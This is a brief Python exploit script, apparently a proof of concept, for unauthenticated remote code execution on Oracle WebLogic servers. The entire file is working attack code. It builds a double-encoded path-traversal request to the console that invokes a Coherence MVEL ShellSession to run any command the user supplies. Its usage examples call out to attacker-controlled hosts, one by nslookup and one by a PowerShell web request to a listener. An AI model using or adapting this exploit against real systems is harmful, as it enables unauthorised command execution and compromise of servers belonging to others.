#!/usr/bin/python3

import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

if len(sys.argv) != 3:
    print("[+] WebLogic Unauthenticated RCE via GET request")
    print("[+] Usage: python3 exploit.py http(s)://target:7001 command")
    print("[+] Example 1: python3 exploit.py http(s)://target:7001 \"nslookup your_Domain\"")
    print("[+] Example 2: python3 exploit.py http(s)://target:7001 \"powershell.exe -c Invoke-WebRequest -Uri http://your_listener\"")
    sys.exit()

target = sys.argv[1]
command = sys.argv[2]

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
session = requests.session()
headers = {'Content-type': 'application/x-www-form-urlencoded; charset=utf-8'}

print("[+] Sending GET Request....")

exploit_url = target + "/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('" + command + "');\");"

response = session.get(exploit_url, verify=False, headers=headers)

print("[+] Done!!")
